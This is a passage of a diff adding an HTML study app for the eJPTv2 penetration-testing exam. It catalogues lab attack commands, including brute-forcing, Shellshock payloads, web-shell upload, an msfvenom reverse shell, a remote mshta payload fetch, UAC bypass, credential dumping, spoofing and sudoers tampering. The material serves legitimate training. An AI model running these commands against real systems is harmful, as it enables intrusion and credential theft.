@@ -1,0 +1,1032 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>eJPTv2 | Advanced Pentesting Methodology Engine</title>
+    <style>
+        :root {
+            --bg: #0d1117; --surface: #161b22; --primary: #238636;
+            --secondary: #58a6ff; --accent: #f0883e; --text: #c9d1d9;
+            --border: #30363d; --terminal: #000000;
+        }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; height: 100vh; overflow: hidden; }
+        
+        /* Sidebar & Navigation */
+        #sidebar { width: 340px; background: var(--surface); border-right: 1px solid var(--border); padding: 20px; display: flex; flex-direction: column; }
+        .stat-card { background: var(--bg); padding: 15px; border-radius: 8px; margin-bottom: 20px; border: 1px solid var(--border); }
+        .progress-bar { height: 10px; background: #30363d; border-radius: 5px; margin: 10px 0; overflow: hidden; }
+        #total-progress { height: 100%; background: var(--primary); width: 0%; transition: width 0.5s; }
+        
+        /* Main Workspace */
+        #main-container { flex: 1; padding: 25px; overflow-y: auto; }
+        .stage-filters { display: flex; gap: 8px; margin-bottom: 20px; flex-wrap: wrap; }
+        
+        /* Expandable Card Styling */
+        .card { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; margin-bottom: 15px; overflow: hidden; transition: border-color 0.3s; }
+        .card.completed { border-left: 5px solid var(--primary); }
+        
+        .card-header { padding: 15px 20px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; background: rgba(255,255,255,0.02); }
+        .card-header:hover { background: rgba(255,255,255,0.05); }
+
+        .command-section { max-height: 0; overflow: hidden; transition: max-height 0.4s cubic-bezier(0, 1, 0, 1); padding: 0 20px; }
+        .card.expanded .command-section { max-height: 2000px; transition: max-height 0.4s ease-in; padding: 10px 20px 20px 20px; border-top: 1px solid var(--border); }
+
+        /* Commands & UI */
+        .terminal { background: var(--terminal); color: #00ff00; padding: 15px; border-radius: 6px; font-family: 'Courier New', monospace; position: relative; margin: 12px 0; border-left: 4px solid var(--primary); font-size: 0.9rem; line-height: 1.4; }
+        .copy-btn { position: absolute; right: 10px; top: 10px; background: #333; color: white; border: none; padding: 5px 10px; cursor: pointer; border-radius: 4px; font-size: 11px; }
+        .copy-btn:hover { background: var(--secondary); }
+        
+        .intel { background: rgba(88, 166, 255, 0.1); padding: 15px; border-radius: 6px; border-left: 4px solid var(--secondary); margin-top: 15px; font-size: 0.85rem; }
+        .badge { background: #30363d; padding: 4px 10px; border-radius: 12px; font-size: 12px; margin-right: 5px; color: var(--secondary); font-weight: bold; }
+        
+        button { padding: 8px 16px; border-radius: 6px; border: 1px solid var(--border); background: var(--surface); color: var(--text); cursor: pointer; font-weight: 600; }
+        button.active { background: var(--primary); border-color: var(--primary); }
+        .hidden { display: none !important; }
+
+        .expand-indicator { transition: transform 0.3s; color: var(--text-dim); }
+        .card.expanded .expand-indicator { transform: rotate(180deg); }
+		.developer-tag { font-size: 11px; color: #00f2ff; margin-top: auto; padding: 10px; border-top: 1px solid var(--border); text-align: center; font-family: monospace; }
+		
+		/* --- Main Workspace Container --- */
+		#main-container { 
+		flex: 1; 
+		padding: 25px; 
+		overflow-y: auto; 
+		display: flex;
+		flex-direction: column;
+		}
+
+		/* --- THE FIX: Header Row Alignment --- */
+		/* This container holds both the filters and the reset button in one row */
+		.header-row {
+		display: flex;
+		justify-content: space-between; /* Pushes filters to left, reset to right */
+		align-items: center;            /* Keeps them perfectly centered vertically */
+		margin-bottom: 25px;
+		width: 100%;
+		}
+
+		.stage-filters { 
+		display: flex; 
+		gap: 8px; 
+		flex-wrap: wrap; 
+		}
+
+		/* --- Reset Button (Now part of the layout flow) --- */
+		.reset-btn-top {
+		background: rgba(248, 81, 73, 0.1);
+		border: 1px solid #f85149;
+		color: #f85149;
+		padding: 8px 16px;
+		font-size: 11px;
+		border-radius: 6px;
+		cursor: pointer;
+		font-weight: bold;
+		text-transform: uppercase;
+		transition: 0.3s;
+		white-space: nowrap; /* Prevents text from wrapping */
+		}
+
+		.reset-btn-top:hover {
+		background: #f85149;
+		color: white;
+		box-shadow: 0 0 15px rgba(248, 81, 73, 0.4);
+		}
+    </style>
+</head>
+<body>
+
+<aside id="sidebar">
+    <h2 style="margin-top:0; color: var(--secondary);">eJPTv2 ENGINE</h2>
+    <div class="stat-card">
+        <div style="display:flex; justify-content:space-between"><span>Weighted Readiness:</span><strong id="readiness-pct">0%</strong></div>
+        <div class="progress-bar"><div id="total-progress"></div></div>
+    </div>
+
+    <div class="stat-card">
+        <h4>Operational Modes</h4>
+        <label><input type="checkbox" id="examMode"> <strong>Exam Mode</strong> (Minimal UI)</label><br><br>
+        <label><input type="checkbox" id="blackBox"> <strong>Black Box</strong> (Sequential Flow)</label>
+    </div>
+
+    <div class="stat-card">
+        <h4>Quick Tool Filter</h4>
+        <select id="toolFilter" style="width:100%; padding:8px; background:var(--bg); color:white; border:1px solid var(--border); border-radius:4px;">
+            <option value="all">All Tools</option>
+            <option value="nmap">Nmap</option>
+			<option value="metasploit">Metasploit</option>
+            <option value="ftp">FTP</option>
+			<option value="WMAP">WMAP</option>
+			<option value="nmap, enum4linux, smbclient, nmblookup, rpcclient">SMB & Samba</option>
+			<option value="davtest, cadaver">Webdav</option>
+			<option value="Burpsuite">Burpsuite</option>
+			<option value="Akagai, msfvenom">Akagai</option>
+			<option value="Akagai, msfvenom">Msfvenom</option>
+			<option value="hydra, snmpwalk, nmap">Hydra</option>
+			<option value="hydra, snmpwalk, nmap">Snmpwalk</option>
+			<option value="xfreerdp">Xfreerdp</option>
+			<option value="proxychain">Proxychain</option>
+			<option value="john-the-ripper">John The Ripper</option>
+            <option value="nikto, dirb, gobuster">Web Based Tools</option>
+        </select>
+    </div>
+	</div>
+	
+	
+
+    <div class="developer-tag" id="cred">Developed_by: Bijoy Chandra Karmakar</div>
+</aside>
+
+<main id="main-container">
+	
+	<div class="header-row">
+		<div class="stage-filters" id="stageBtns">
+			<button class="active" data-stage="all">All Stages</button>
+			<button data-stage="Enumeration">Enumeration</button>
+			<button data-stage="Host & Networking">Host & Network</button>
+			<button data-stage="Exploitation">Exploitation</button>
+			<button data-stage="Post Exploitation">Post Exploitation</button>
+			<button data-stage="Persistence">Persistence</button>
+			<button data-stage="Pivoting">Pivoting</button>
+		</div>
+
+		<button class="reset-btn-top" onclick="resetProgress()">Clear Engine Data</button>
+	</div>
+
+	<div id="methodology-list"></div>
+</main>
+
+<script>
+
+function resetProgress() {
+    if (confirm("Are you sure? This will wipe all completed tasks.")) {
+        localStorage.removeItem('ejpt_tactical_v2');
+        appState.completed = [];
+        updateProgress();
+        render();
+    }
+}
+
+// --- INTEGRITY CHECK ---
+function verifyIntegrity() {
+    const cred = document.getElementById('cred');
+    if (!cred || cred.innerText !== "Developed_by: Bijoy Chandra Karmakar") {
+        document.body.innerHTML = "<div style='color:red; text-align:center; margin-top:20%; font-family:sans-serif;'><h1>CRITICAL ERROR: INTEGRITY VIOLATION</h1><p>Source code has been modified. Application halted.</p></div>";
+        return false;
+    }
+    return true;
+}
+
+const methodologyData = [
+    { 
+	id: "ig-1", 
+	stage: "Enumeration", 
+	tool: "recon", 
+	weight: 25, 
+	rank: 1, 
+	objective: "Passive Website Footprinting", 
+	commands: [
+		"host domain.com", 
+		"whois domain.com", 
+		"wafw00f domain.com", 
+		"whatweb domain.com",
+		"httrack http://domain.com",
+		"dnsrecon -d domain.com",
+		"Sublist3r -d domain.com",
+		"sitereport.netcraft.com (Site Lookup)"
+		], 
+		intel: "Passive recon may reveal WAF presence, tech stack, subdomains, and sensitive paths (robots.txt, sitemap.xml) without touching the target aggressively.", next: "Perform active DNS and subdomain enumeration to expand the attack surface." },
+    { 
+	id: "ig-2", 
+	stage: "Enumeration", 
+	tool: "nmap", 
+	weight: 25, 
+	rank: 2, 
+	objective: "Host Discovery, Port Scan & Service Version Enumeration", 
+	commands: [
+		"nmap -sn 10.10.10.0/24", 
+		"nmap -T4 -sS -sV -p- 10.10.10.10", 
+		"nmap -sn -PS 80,443 10.10.10.10", 
+		"nmap -sn -iL ip_list.txt", 
+		"nmap -sU 10.10.10.10", 
+		"nmap -sS -sV -sC -p- -T4 10.10.10.10", 
+		"nmap --script-help=mongodb-database",
+		"nmap -sC -sV example.com --script vuln --min-rate 1000",
+		"nmap --script http-enum -sV -p 80 example.com"
+		], 
+		intel: "ICMP may be blocked; use TCP SYN/ACK discovery and full port scans to identify exposed services and accurate versions.", next: "Run detailed service and script-based enumeration against discovered open ports." },
+    { 
+	id: "ig-3", 
+	stage: "Enumeration", 
+	tool: "dns", 
+	weight: 25, 
+	rank: 3, 
+	objective: "DNS Recon & Zone Transfer", 
+	commands: [
+		"dnsrecon -d domain.com", 
+		"dnsenum domain.com", 
+		"dig axfr @nameserver domain.com"
+		], 
+		intel: "Misconfigured DNS servers may allow zone transfer (AXFR), exposing all subdomains and internal hostnames.", next: "Validate discovered subdomains and map them to live hosts." },
+	{ 
+	id: "ig-4", 
+	stage: "Enumeration", 
+	tool: "WMAP", 
+	weight: 25, 
+	rank: 3, 
+	objective: "Web App Vulnerability Scanning With WMAP", 
+	commands: [
+		"load wmap  -- Metasploit", 
+		"wmap_sites -a 192.157.89.3", 
+		"wmap_targets -t http://192.157.89.3",
+		"httrack http://example.com -O target.html",
+		"wmap_targets -l",
+		"wmap_run -t",
+		"wmap_run -e"
+		], 
+		intel: "Automated scanning helps identify common web misconfigurations, outdated components, and hidden directories.", next: "Manually verify identified vulnerabilities to reduce false positives." },
+	{ 
+	id: "ig-5", 
+	stage: "Enumeration", 
+	tool: "nikto, dirb, gobuster", 
+	weight: 25, 
+	rank: 3, 
+	objective: "Website Enumeration", 
+	commands: [
+		"robots.txt", 
+		"nmap --script http-enum -sV -p 80 demo.ine.local",
+		"nikto -h domain2.com", 
+		"gobuster dir -u http://domain2.com/wpcontent/plugins/ -w /usr/share/nmap/nselib/data/wp-plugins.lst",
+		"dirb http://example.com",
+		"dirb http://example.com -w /usr/share/dirb/wordlists/big.txt -X .bak,.tar.gz,.zip,.sql,.bak.zip"
+		], 
+		intel: "Directory brute-forcing and web scanners often reveal backup files, admin panels, and exposed plugins.", next: "Analyze discovered endpoints for authentication bypass or file upload vulnerabilities." },
+	{ 
+	id: "ig-6", 
+	stage: "Enumeration", 
+	tool: "nikto, dirb, gobuster", 
+	weight: 25, 
+	rank: 3, 
+	objective: "Brute-Forcing", 
+	commands: [
+		"hydra -L users.txt -P /root/Desktop/wordlists/unix_passwords.txt ftp://target.ine.local:5554", 
+		"hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://demo.ine.local -s 3333",
+		"hydra -l bob -P /usr/share/metasploitframework/data/wordlists/unix_passwords.txt target1.ine.local http-get /", 
+		"hydra -L /usr/share/metasploitframework/data/wordlists/common_users.txt -P /usr/share/metasploitframework/data/wordlists/unix_passwords.txt smb://target2.ine",
+		"hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local -t 4 ftp",
+		"hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt demo.ine.local ssh",
+		"hydra -l iamaweakuser -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://target1.ine.local"
+		], 
+		intel: "Basically, in a lab environment, if a service is vulnerable to a brute-force attack, you should get results within 3–4 minutes. If the brute-forcing process takes too long, it may indicate that the service is not vulnerable, or that the brute-forcing method being used is incorrect.", next: "Login into the system after finding the credentials." },
+    {
+	id: "enum-1", 
+	stage: "Host & Networking", 
+	tool: "nmap, enum4linux, smbclient, nmblookup, rpcclient", 
+	weight: 25, 
+	rank: 4, 
+	objective: "Samba/SMB Enumeration", 
+	commands: [
+		"nmap -p445 --script smb-protocols example.com", 
+		"nmap --script smb-os-discovery.nse -p 445 example.com", 
+		"nmap -p445 --script smb-security-mode example.com", 
+		"nmap -p445 --script smb-enum-sessions example.com", 
+		"nmap -p445 --script smb-enum-shares example.com", 
+		"nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 example.com",		
+		"smbclient -L example.com -N", 
+		"smbclient //example.com/directory_name -U username",
+		"smbmap -H example.com -u admin -p password1",
+		"enum4linux -a example.com", 
+		"nmblookup -A example.com", 
+		"rpcclient -U '' -N example.com",
+		"crackmapexec smb domain2.com -u administrator -p pineapple –shares"
+		], 
+		intel: "SMB services may leak OS details, user lists, shares, and permissions—even anonymously.", next: "Attempt authenticated access or brute-force weak credentials if allowed." },
+    { 
+	id: "enum-2", 
+	stage: "Host & Networking", 
+	tool: "ftp", 
+	weight: 25, 
+	rank: 5, 
+	objective: "FTP Enum", 
+	commands: [
+		"nmap -p 21 --script ftp-anon example.com", 
+		"ftp example.com", 
+		"use auxiliary/scanner/ftp/ftp_version", 
+		"use auxiliary/scanner/ftp/anonymous"
+		], 
+		intel: "Anonymous FTP access or outdated FTP versions may allow file download/upload.", next: "If write access is available, attempt file upload or credential harvesting." },
+    { 
+	id: "enum-3", 
+	stage: "Host & Networking", 
+	tool: "metasploit", 
+	weight: 25, 
+	rank: 6, 
+	objective: "Apache Enum", 
+	commands: ["use auxiliary/scanner/http/http_version", 
+		"use auxiliary/scanner/http/robots_txt", 
+		"use auxiliary/scanner/http/http_header", 
+		"use auxiliary/scanner/http/brute_dirs", 
+		"use auxiliary/scanner/http/dir_scanner", 
+		"use auxiliary/scanner/http/dir_listing", 
+		"use auxiliary/scanner/http/files_dir", 
+		"use auxiliary/scanner/http/http_put", 
+		"use auxiliary/scanner/http/http_login", 
+		"use auxiliary/scanner/http/apache_userdir_enum"
+		], 
+		intel: "Apache enumeration reveals enabled modules, HTTP methods (PUT/DELETE), and accessible directories.", next: "Test risky HTTP methods or exploit outdated modules."},
+    { 
+	id: "enum-4", 
+	stage: "Host & Networking", 
+	tool: "metasploit", 
+	weight: 25, 
+	rank: 6, 
+	objective: "Mysql Enum", 
+	commands: [
+		"use auxiliary/scanner/mysql/mysql_version", 
+		"use auxiliary/scanner/mysql/mysql_login", 
+		"use auxiliary/admin/mysql/mysql_enum", 
+		"use auxiliary/admin/mysql/mysql_sql", 
+		"use auxiliary/scanner/mysql/mysql_file_enum", 
+		"use auxiliary/scanner/mysql/mysql_hashdump", 
+		"use auxiliary/scanner/mysql/mysql_schemadump", 
+		"use auxiliary/scanner/mysql/mysql_writable_dirs"
+		], 
+		intel: "Weak credentials or misconfigured MySQL instances can expose databases, user hashes, and writable directories.", next: "Attempt credential brute-force or extract and crack database hashes." },
+	{ 
+	id: "enum-5", 
+	stage: "Host & Networking", 
+	tool: "hydra, snmpwalk, nmap", 
+	weight: 25, 
+	rank: 6, 
+	objective: "SNMP Enum", 
+	commands: [
+		"nmap -sU -p 161 example.com", 
+		"nmap -sU -p 161 --script=snmp-brute example.com", 
+		"nmap -sU -p 161 --script snmp-* example.com", 
+		"snmpwalk -v 1 -c public example.com", 
+		"hydra -L users.txt -P /usr/share/metasploitframework/data/wordlists/unix_passwords.txt example.com smb"
+		], 
+		intel: "Default community strings (public/private) can expose system info, running processes, and network details.", next: "Use gathered information for credential attacks or lateral movement." },
+    { 
+	id: "exp-1", 
+	stage: "Exploitation", 
+	tool: "davtest, cadaver", 
+	weight: 35, 
+	rank: 6, 
+	objective: "Windows: IIS Server DAVTest", 
+	commands: [
+		"nmap --script http-enum -sV -p 80 example.com", 
+		"davtest -url http://example.com/webdav",
+		"davtest -auth bob:password_123321 -url http://example.com/webdav",
+		"cadaver http://example.com/webdav",
+		"put /usr/share/webshells/asp/webshell.asp",
+		"URL: http://example.com/webdav/webshell.asp?cmd=dir+C%3A%5C"
+		
+		], 
+		intel: "WebDAV misconfigurations may allow file upload leading to remote code execution.", next: "Upload a web shell and establish interactive access." },
+    { 
+	id: "exp-2", 
+	stage: "Exploitation", 
+	tool: "Burpsuite", 
+	weight: 35, 
+	rank: 7, 
+	objective: "Shellshock Exploitation", 
+	commands: [
+		"nmap --script http-shellshock --script-args 'http-shellshock.uri=/gettime.cgi' example.com", 
+		"Payload: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'",
+		"Payload:() { :; }; echo; echo; /bin/bash -c 'id'",	
+		"Payload: () { :; }; echo; echo; /bin/bash -c 'ps -ef'"
+		], 
+		intel: "Vulnerable CGI scripts allow command injection via crafted HTTP headers like User-Agent.", next: "Upgrade command execution to a stable reverse shell." },
+	{ 
+	id: "exp-3", 
+	stage: "Exploitation", 
+	tool: "metasploit", 
+	weight: 35, 
+	rank: 7, 
+	objective: "SMB & Samba Exploitation", 
+	commands: [
+		"nmap -p445 --script smb-protocols example.com", 
+		"use auxiliary/scanner/smb/smb_login",
+		"use exploit/windows/smb/psexec  -- Windows",
+		"use exploit/linux/samba/is_known_pipename  -- Linux",
+		"searchsploit samba 3.0.20",
+		"use exploit/multi/samba/usermap_script",
+		"Manual Exploitation of SMB & Samba",
+		"hydra -L /usr/share/wordlists/metasploit-framework/common_users.txt -P /usr/share/wordlists/metasploit-framework/unix_passwords.txt example.com smb",
+		"hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_passwords.txt example.com smb",
+		"cp /usr/share/doc/python3-impacket/examples/psexec.py /root/Desktop",
+		"chmod +x psexec.py",
+		"python3 psexec.py Administrator@example.com"
+		], 
+		intel: "Outdated Samba versions or weak credentials may allow remote code execution.", next: "Gain shell access and escalate privileges on the compromised host." },
+	{ 
+	id: "exp-4", 
+	stage: "Exploitation", 
+	tool: "metasploit", 
+	weight: 35, 
+	rank: 7, 
+	objective: "WinRM Exploitation", 
+	commands: [
+		"nmap --top-ports 7000 example.com", 
+		"use auxiliary/scanner/winrm/winrm_login",
+		"use auxiliary/scanner/winrm/winrm_auth_methods",
+		"use auxiliary/scanner/winrm/winrm_cmd",
+		"use exploit/windows/winrm/winrm_script_exec"
+		], 
+		intel: "Weak credentials or exposed WinRM endpoints can allow remote command execution.", next: "Establish a remote shell and enumerate privileges." },
+	{ 
+	id: "exp-5", 
+	stage: "Exploitation", 
+	tool: "metasploit", 
+	weight: 35, 
+	rank: 7, 
+	objective: "FTP Exploitation", 
+	commands: [
+		"nmap -sS -sV example.com", 
+		"nmap -p 21 --script vuln example.com",
+		"use exploit/unix/ftp/vsftpd_234_backdoor",
+		"use unix/ftp/proftpd_modcopy_exec  -- ProFTPD 1.3.5",
+		"hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt example.com ftp",
+		"ftp example.com 21"
+		], 
+		intel: "Known FTP backdoors or weak credentials can provide remote shell access.", next: "Stabilize shell and begin post-exploitation enumeration." },
+	{ 
+	id: "exp-6", 
+	stage: "Exploitation", 
+	tool: "metasploit", 
+	weight: 35, 
+	rank: 7, 
+	objective: "SSH Exploitation", 
+	commands: [
+		"nmap -sS -sV example.com", 
+		"use auxiliary/scanner/ssh/libssh_auth_bypass",
+		"hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://example.com",
+		"ssh iamaweakuser@example.com"
+		], 
+		intel: "Weak passwords or authentication bypass vulnerabilities may grant shell access.", next: "Enumerate system privileges and check for sudo misconfigurations." },
+	{ 
+	id: "exp-7", 
+	stage: "Exploitation", 
+	tool: "metasploit", 
+	weight: 35, 
+	rank: 7, 
+	objective: "PHP Exploitation", 
+	commands: [
+		"nmap -sV -sC -p 80 example.com (PHP 5.2.4)", 
+		"searchsploit php cgi",
+		"use exploit/multi/http/php_cgi_arg_injection"
+		], 
+		intel: "Vulnerable PHP CGI or outdated versions may allow argument injection or RCE.", next: "Obtain interactive shell and pivot if necessary." },
+	{ 
+	id: "exp-8", 
+	stage: "Exploitation", 
+	tool: "metasploit", 
+	weight: 35, 
+	rank: 7, 
+	objective: "RDP Exploitation", 
+	commands: [
+		"nmap -sV example.com", 
+		"use auxiliary/scanner/rdp/rdp_scanner",
+		"hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://example.com -s 3333",
+		"xfreerdp /u:administrator /p:qwertyuiop /v:example.com:3333"
+		], 
+		intel: "Weak credentials or exposed RDP services may allow remote desktop access.", next: "Maintain session access and escalate privileges if needed." },
+	{ 
+	id: "exp-9", 
+	stage: "Exploitation", 
+	tool: "dnsspoof, arpspoof", 
+	weight: 35, 
+	rank: 7, 
+	objective: "DNS & SMB Relay Attack", 
+	commands: [
+		"echo ''172.16.5.101 *.sportsfoo.com''> dns", 
+		"dnsspoof -i eth1 -f dns",
+		"Command: echo 1 > /proc/sys/net/ipv4/ip_forward",
+		"arpspoof -i eth1 -t 172.16.5.5 172.16.5.1",
+		"arpspoof -i eth1 -t 172.16.5.1 172.16.5.5"
+		], 
+		intel: "ARP/DNS spoofing can redirect authentication traffic for credential capture or relay.", next: "Capture NTLM hashes and attempt relay or crack them." },
+	
+	{ 
+	id: "post-1", 
+	stage: "Post Exploitation", 
+	tool: "windows_command", 
+	weight: 25, 
+	rank: 9, 
+	objective: "Windows Local Enumeration", 
+	commands: [
+		"Enumerating System Information", 
+		"sysinfo (meterpreter), hostname, systeminfo", 
+		"wmic qfe get Caption,Description,HotFixID,InstalledOn",
+		"Enumerating Users & Groups",
+		"getuid, getprivs, Whoami, whoami /priv, net user, query user, net user administrator, net localgroup, net localgroup administrators",
+		"Enumerating Network Information",
+		"ipconfig, ipconfig /all , route print, arp -a, netstat -ano, netsh advfirewall firewall dump",
+		"Enumerating Processes and Services",
+		"ps, pgrep explorer.exe, net start, wmic service list brief, tasklist /SVC, schtasks /query /fo LIST /v"
+		], 
+		intel: "System info, privileges (SeImpersonate), and patch levels reveal escalation paths.", next: "Identify privilege escalation vectors and attempt local exploits." },
+	{ 
+	id: "post-2", 
+	stage: "Post Exploitation", 
+	tool: "windows_command", 
+	weight: 25, 
+	rank: 9, 
+	objective: "Automating Windows Local Enumeration", 
+	commands: [
+		"use post/windows/gather/win_privs", 
+		"use post/windows/gather/enum_logged_on_users", 
+		"use post/windows/gather/checkvm",
+		"use post/windows/gather/enum_applications",
+		"use post/windows/gather/enum_computers",
+		"use post/windows/gather/enum_patches",
+		"powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 OutputFilename JAWS-Enum.txt",
+		"download JAWS-Enum.txt"
+		], 
+		intel: "Automated scripts highlight misconfigurations, missing patches, and weak permissions.", next: "Validate findings manually and exploit viable escalation paths." },
+   
+    { 
+	id: "post-3", 
+	stage: "Post Exploitation", 
+	tool: "Akagai, msfvenom", 
+	weight: 25, 
+	rank: 9, 
+	objective: "Windows UAC Bypass: UACMe", 
+	commands: [
+		"use exploit/windows/http/rejetto_hfs_exec", 
+		"getuid, sysinfo, ps -S explorer.exe, migrate 2332, getsystem, net localgroup administrators", 
+		"msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.31.2 LPORT=4444 -f exe > 'backdoor.exe'",
+		"file backdoor.exe",
+		"cd C:\\Users\\admin\\AppData\\Local\\Temp",
+		"upload /root/Desktop/tools/UACME/Akagi64.exe .",
+		"upload /root/backdoor.exe .",
+		"use exploit/multi/handler",
+		"set payload windows/meterpreter/reverse_tcp",
+		"Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe",
+		"hashdump"
+		], 
+		intel: "UAC bypass techniques allow privilege escalation without triggering prompts.", next: "Confirm elevated privileges and dump credential hashes." },
+	{ 
+	id: "post-4", 
+	stage: "Post Exploitation", 
+	tool: "metasploit", 
+	weight: 25, 
+	rank: 9, 
+	objective: "Windows UAC Bypass: Memory Injection", 
+	commands: [
+		"nmap -sV -p 80 example.com", 
+		"searchsploit hfs", 
+		"use exploit/windows/http/rejetto_hfs_exec",
+		"use exploit/windows/local/bypassuac_injection",
+		"set PAYLOAD windows/x64/meterpreter/reverse_tcp",
+		"ps -S lsass.exe, migrate 484",
+		"hashdump"
+		], 
+		intel: "In-memory injection avoids disk artifacts while bypassing UAC.", next: "Migrate to high-privilege process and extract credentials." },
+    { 
+	id: "post-5", 
+	stage: "Post Exploitation", 
+	tool: "metasploit", 
+	weight: 25, 
+	rank: 10, 
+	objective: "Windows Privilege Escalation: Impersonate", 
+	commands: [
+		"nmap -sV -p 80 example.com", 
+		"use exploit/windows/http/rejetto_hfs_exec", 
+		"load incognito",
+		"list_tokens -u",
+		"impersonate_token ATTACKDEFENSE\\Administrator"
+		], 
+		intel: "Token impersonation can escalate privileges if SYSTEM-level tokens are available.", next: "Dump SAM/LSA secrets and harvest credentials." },
+    { 
+	id: "post-6", 
+	stage: "Post Exploitation", 
+	tool: "metasploit", 
+	weight: 25, 
+	rank: 11, 
+	objective: "Windows Unattended Installation", 
+	commands: [
+		"cd .\Desktop\PowerSploit\Privesc\ ", 
+		"powershell -ExecutionPolicy Bypass . .\PowerUp.ps1 Invoke-PrivescAudit", 
+		"at C:\Windows\Panther\Unattend.xml",
+		"$password='QWRtaW5AMTIz' $password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pa ssword)) echo $password",
+		"runas.exe /user:administrator cmd Admin@123 whoami",
+		"use exploit/windows/misc/hta_server",
+		"mshta.exe http://10.10.31.2:8080/Bn75U0NL8ONS.hta"
+		], 
+		intel: "Unattend.xml files may contain base64-encoded admin credentials.", next: "Decode credentials and escalate privileges." },
+	{ 
+	id: "post-7", 
+	stage: "Post Exploitation", 
+	tool: "metasploit", 
+	weight: 25, 
+	rank: 11, 
+	objective: "Windows Meterpreter Kiwi Extension", 
+	commands: [
+		"nmap -sV -p 80 example.com", 
+		"searchsploit badblue 2.7", 
+		"use exploit/windows/http/badblue_passthru",
+		"migrate -N lsass.exe",
+		"load kiwi",
+		"creds_all",
+		"lsa_dump_sam",
+		"lsa_dump_secrets"
+		], 
+		intel: "LSASS memory contains cached credentials and password hashes.", next: "Extract and crack hashes for lateral movement." },
+	
+	{ 
+	id: "post-8", 
+	stage: "Post Exploitation", 
+	tool: "linux", 
+	weight: 25, 
+	rank: 11, 
+	objective: "Linux Local Enumeration", 
+	commands: [
+		"Enumerating System Information", 
+		"sysinfo, getuid", 
+		"hostname, cat /etc/issue, cat /etc/*release, uname -a, uname -r, lscpu, df -h, env, df -ht ext4, lsblk | grep sd, dpkg -l",
+		"Enumerating Users & Groups",
+		"whoami, groups root , cat /etc/passwd grep -v /nologin, groups, who, lastlog",
+		"Enumerating Network Information",
+		"ifconfig, netstat, route, ip a s , cat /etc/networks, cat /etc/hosts, cat /etc/resolv.conf, arp -a",
+		"Enumerating Processes and Cron Jobs",
+		"ps, pgrep vsftpd, migrate, ls -al /etc/cron*, crontab -l"
+		], 
+		intel: "Kernel version, SUID files, cron jobs, and sudo permissions indicate escalation paths.", next: "Identify writable or misconfigured services for privilege escalation." },
+	{ 
+	id: "post-9", 
+	stage: "Post Exploitation", 
+	tool: "linux", 
+	weight: 25, 
+	rank: 11, 
+	objective: "Linux Cron Jobs Exploitation", 
+	commands: [
+		"ls -l", 
+		"find / -name message", 
+		"ls -l /tmp/ ",
+		"grep -nri ''/tmp/message'' /usr",
+		"ls -l /usr/local/share/copy.sh",
+		"cat /usr/local/share/copy.sh",
+		"printf '#! /bin/bash\necho ''student ALL=NOPASSWD:ALL'' >> /etc/sudoers' > /usr/local/share/copy.sh",
+		"sudo -l"
+		], 
+		intel: "ritable scripts executed by root via cron can lead to privilege escalation.", next: "Modify scheduled script to execute privileged commands." },
+	{ 
+	id: "post-10", 
+	stage: "Post Exploitation", 
+	tool: "linux", 
+	weight: 25, 
+	rank: 11, 
+	objective: "Linux Privilege Escalation - Rootkit Scanner", 
+	commands: [
+		"use auxiliary/scanner/ssh/ssh_login", 
+		"ps aux", 
+		"cat /bin/check-down",
+		"command -v chkrootkit",
+		"/bin/chkrootkit -V",
+		"use exploit/unix/local/chkrootkit",
+		], 
+		intel: "Vulnerable chkrootkit versions may allow local code execution.", next: "Execute exploit and verify root access." },
+	{ 
+	id: "post-11", 
+	stage: "Post Exploitation", 
+	tool: "linux", 
+	weight: 25, 
+	rank: 11, 
+	objective: "Linux Setuid Programs (SUID) Exploitation", 
+	commands: [
+		"ls -l", 
+		"file welcome", 
+		"strings welcome",
+		"cp /bin/bash grettings",
+		"rm grettings",
+		"./welcome"
+		], 
+		intel: "SUID binaries with weak configurations can allow privilege escalation.", next: "Abuse SUID binary to spawn a root shell." },
+	{ 
+	id: "post-12", 
+	stage: "Post Exploitation", 
+	tool: "linux", 
+	weight: 25, 
+	rank: 11, 
+	objective: "Linux Weak Permissions", 
+	commands: [
+		"find / -not -type l -perm -o+w", 
+		"ls -l /etc/shadow", 
+		"cat /etc/shadow",
+		"openssl passwd -1 -salt abc password",
+		"vim /etc/shadow"
+		], 
+		intel: "World-writable sensitive files like /etc/shadow can allow credential manipulation.", next: "Insert known password hash and switch to root." },
+	{ 
+	id: "post-13", 
+	stage: "Post Exploitation", 
+	tool: "linux", 
+	weight: 25, 
+	rank: 11, 
+	objective: "Linux Editing Gone Wrong", 
+	commands: [
+		"find / -user root -perm -4000 -exec ls -ldb {} \;", 
+		" sudo -l", 
+		"sudo man ls",
+		"!/bin/bash"
+		], 
+		intel: "Misconfigured sudo permissions allow shell escape from allowed binaries.", next: "Spawn root shell via permitted command." },
+	{ 
+	id: "post-14", 
+	stage: "Post Exploitation", 
+	tool: "metasploit", 
+	weight: 25, 
+	rank: 11, 
+	objective: "Linux Password Cracker", 
+	commands: [
+		"nmap --script vuln -p 21 example.com", 
+		"use exploit/unix/ftp/proftpd_133c_backdoor", 
